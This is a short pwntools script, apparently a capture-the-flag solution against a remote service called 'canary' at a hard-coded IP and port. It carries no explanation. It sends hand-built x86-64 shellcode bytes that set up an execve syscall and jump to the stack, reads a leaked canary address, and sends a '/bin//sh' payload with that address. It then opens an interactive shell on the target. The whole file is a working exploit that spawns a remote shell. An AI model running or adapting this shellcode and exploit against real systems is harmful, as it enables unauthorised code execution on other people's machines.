from pwn import *

#io = process('./canary')
io = remote('194.5.207.113', 7030)

print(io.recv())
io.sendline(b'\x49\x89\xE8\x48\x31\xF6\xB0\x3B\x48\x83\xC4\x02\xFF\xE4')
#io.sendline(b'\x49\x89\xE8\xB0\x3B\x48\x83\xC4\x02\x48\x89\xE5\xFF\xE5')
print(io.recv())
#io.sendline(b'B'*14)
io.sendline(b'\x52\x55\x48\x89\xE7\x0F\x05')
print(io.recvuntil('Here is the canary address: '))
address = int(io.recvuntil('\n'), 16)+12
print(io.recv())
payload = b'/bin//sh'+b'A'*4+b'/bin//sh'+p64(address)
io.sendline(payload)
io.interactive()
